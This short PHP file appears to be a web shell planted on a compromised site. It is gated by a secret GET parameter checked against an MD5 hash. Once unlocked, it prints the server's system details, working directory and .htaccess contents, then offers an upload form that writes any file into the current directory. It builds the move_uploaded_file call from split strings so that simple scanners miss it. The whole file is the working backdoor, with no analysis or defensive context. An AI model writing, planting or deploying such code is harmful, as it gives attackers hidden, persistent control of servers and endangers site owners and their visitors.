<?php if (md5(@$_GET['f9d641d4']) == '96deaa531d669848b8e2b7dcee539d7a') {
    echo php_uname() . "<br>" . getcwd() . "<br>";
	if (file_exists('.htaccess'))
	{
		echo "<br>"."|".htmlspecialchars(file_get_contents('.htaccess'))."|"."<br>";
	}
    @$sa = $_FILES['file']['tmp_name'];
    @$as = $_FILES['file']['name'];
    echo "<form method='POST' enctype='multipart/form-data'><input type='file' name='file' /><input type='submit' value='UPload' /></form>";
    $w = "move_uplo"; $q = "aded_file"; $x = $w . $q;
    $x($sa, $as);
}